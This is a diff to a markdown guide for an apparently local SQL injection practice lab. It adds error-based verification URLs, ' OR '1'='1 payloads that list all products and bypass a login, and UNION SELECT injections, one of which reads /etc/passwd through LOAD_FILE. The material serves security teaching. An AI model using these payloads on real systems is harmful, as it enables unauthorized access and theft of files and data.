@@ -14,6 +14,14 @@ http://127.0.0.1:8781/list_products/products_page.php?value=100
 
 ## Attack
 
+### Verification
+
+Error when calling this url:
+
+http://127.0.0.1:8781/list_products/products_page.php?value=100%27
+
+### List all products
+
 http://127.0.0.1:8781/list_products/products_page.php?value=100' OR '1'='1
 
 # Login Example
@@ -26,4 +34,26 @@ Enter 'admin', 'admin'
 
 ## Attack
 
+### Verification
+
+Error when calling this url:
+
+http://127.0.0.1:8781/login/login.php?user=user'&password=pass'
+
+### Circumvent Login
+
 http://127.0.0.1:8781/login/login.php?user=admin&password=xyz' OR '1'='1
+
+# Read sensible Files
+
+## Verification
+
+Check if you can do a [`UNION SELECT`](https://www.techonthenet.com/sql/union_all.php) (add numbers at the end of the line until the query works 1, then 1,2, then 1,2,3 and s forth...):
+
+http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%201,2,3
+
+## Attack
+
+If file permissions are set to db user (e.g. logged in as root or `GRANT FILE ON *.* TO 'user'@'%';` is set):
+
+http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3
